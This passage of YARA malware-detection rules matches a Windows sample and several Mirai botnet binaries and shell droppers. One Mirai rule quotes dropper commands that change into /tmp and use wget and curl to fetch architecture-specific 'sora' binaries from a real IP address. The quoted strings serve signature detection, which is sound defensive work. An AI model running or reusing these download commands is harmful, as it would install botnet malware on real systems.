      hash11 = "91638b5c9331d91c57a3b55363a7f5c76082d9261a8cfefc34fd3923dcf32dd5"
      hash12 = "9aa99c6f7cab60192507282874b120aa0401f64a2a56c23ef23aa781a90e7c5f"
      hash13 = "a6640f14b119df661bb6d99d1e16a07a5d0f609c5d4ea3375ef3fa74bcab8d14"
      hash14 = "b4cc18207df83ad7c5fee8b34d2f2e680ba7dc45e51002d62712034a4cef69c6"
      hash15 = "d017447f8ef2d707ce3a908e05bcac2206d8f5b8d63b72e494a81eb379b69853"
      hash16 = "d42ac4e3da7e1aa7ae41d0547c0cdcf1e30300fb2ea96cea42bb1d43a5000b27"
      hash17 = "db728098ee83742156ca473750c72cc14ea5d249cb61a1168009eacbd880c1b3"
   strings:
      $s1 = "Processor (CPU)" fullword wide /* score: '15.00'*/
      $s2 = "GetDirectory I/O error" fullword wide /* score: '12.00'*/
      $s3 = "GetDirectory Failed" fullword wide /* score: '12.00'*/
      $s4 = "GetDrives I/O error" fullword wide /* score: '12.00'*/
      $s5 = "GetDirectory No permission" fullword wide /* score: '9.00'*/
      $s6 = "GetDirectory Path too long" fullword wide /* score: '9.00'*/
      $s7 = "GetDirectory Directory not found" fullword wide /* score: '9.00'*/
      $s8 = "GetDirectory File not found" fullword wide /* score: '9.00'*/
      $s9 = "GetDrives No permission" fullword wide /* score: '9.00'*/
      $s10 = "GetDrives No drives" fullword wide /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( all of them )
      ) or ( all of them )
}

rule _Mirai_signature__e486a686_Mirai_signature__e835b89a_Mirai_signature__fc1120ee_66 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_e486a686.elf, Mirai(signature)_e835b89a.elf, Mirai(signature)_fc1120ee.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e486a6860fcb52ef37d48811497e8d711911ba30240fa83aa8e63f86980c6999"
      hash2 = "e835b89aa1f95af1187d308b10555035f7f6fb97b6782d0f611a957720647ea0"
      hash3 = "fc1120eef2173283dc316199b4c756cc39a7fd4748daed6e558b5d0c0fbc8c61"
   strings:
      $s1 = "[DEBUG] killer_init: Scanning %s for processes" fullword ascii /* score: '23.00'*/
      $s2 = "[DEBUG] Starting attack. Duration: %d, Vector: %d, Targets: %d, Options: %d" fullword ascii /* score: '19.50'*/
      $s3 = "[DEBUG] killer_kill: Killing killer process" fullword ascii /* score: '15.00'*/
      $s4 = "[DEBUG] killer_init: Initializing killer process" fullword ascii /* score: '15.00'*/
      $s5 = "[DEBUG] attack_method_udp called with %d targets" fullword ascii /* score: '13.00'*/
      $s6 = "[DEBUG] Attack method finished execution" fullword ascii /* score: '12.00'*/
      $s7 = "[DEBUG] killer_init: Failed to open /proc/self/exe" fullword ascii /* score: '11.00'*/
      $s8 = "[DEBUG] killer_init: Not running in child or fork failed" fullword ascii /* score: '10.00'*/
      $s9 = "[DEBUG] Added attack method: %d, Total: %d" fullword ascii /* score: '9.50'*/
      $s10 = "[DEBUG] connect" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _Mirai_signature__e19e787e_Mirai_signature__f233f772_Mirai_signature__f604101d_67 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_e19e787e.sh, Mirai(signature)_f233f772.sh, Mirai(signature)_f604101d.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e19e787e4f61db39f7c388070f54b00a47281bade9e9ec1a72884675ad618ac4"
      hash2 = "f233f77247bef987f907ba7fcd2e299ab754cd065a564fa7d86c8951eae17f24"
      hash3 = "f604101df9ff20d7c9cda753ce665e059b3943fd1dfb28a793995769ae1edf87"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://38.162.114.77/bins/sora.ppc; curl -O http://38.162.114.77/bin" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://38.162.114.77/bins/sora.x86; curl -O http://38.162.114.77/bin" ascii /* score: '27.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://38.162.114.77/bins/sora.mpsl; curl -O http://38.162.114.77/bi" ascii /* score: '27.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://38.162.114.77/bins/sora.i686; curl -O http://38.162.114.77/bi" ascii /* score: '27.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://38.162.114.77/bins/sora.ppc440fp; curl -O http://38.162.114.7" ascii /* score: '27.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://38.162.114.77/bins/sora.i468; curl -O http://38.162.114.77/bi" ascii /* score: '27.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://38.162.114.77/bins/sora.arm6; curl -O http://38.162.114.77/bi" ascii /* score: '27.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://38.162.114.77/bins/sora.arm5; curl -O http://38.162.114.77/bi" ascii /* score: '27.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://38.162.114.77/bins/sora.m68k; curl -O http://38.162.114.77/bi" ascii /* score: '27.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://38.162.114.77/bins/sora.x86_64; curl -O http://38.162.114.77/" ascii /* score: '27.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://38.162.114.77/bins/sora.sh4; curl -O http://38.162.114.77/bin" ascii /* score: '27.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://38.162.114.77/bins/sora.arm7; curl -O http://38.162.114.77/bi" ascii /* score: '27.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://38.162.114.77/bins/sora.arm4; curl -O http://38.162.114.77/bi" ascii /* score: '27.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://38.162.114.77/bins/sora.mips; curl -O http://38.162.114.77/bi" ascii /* score: '27.00'*/
   condition:
      ( uint16(0) == 0x2123 and filesize < 8KB and ( 8 of them )
      ) or ( all of them )
}

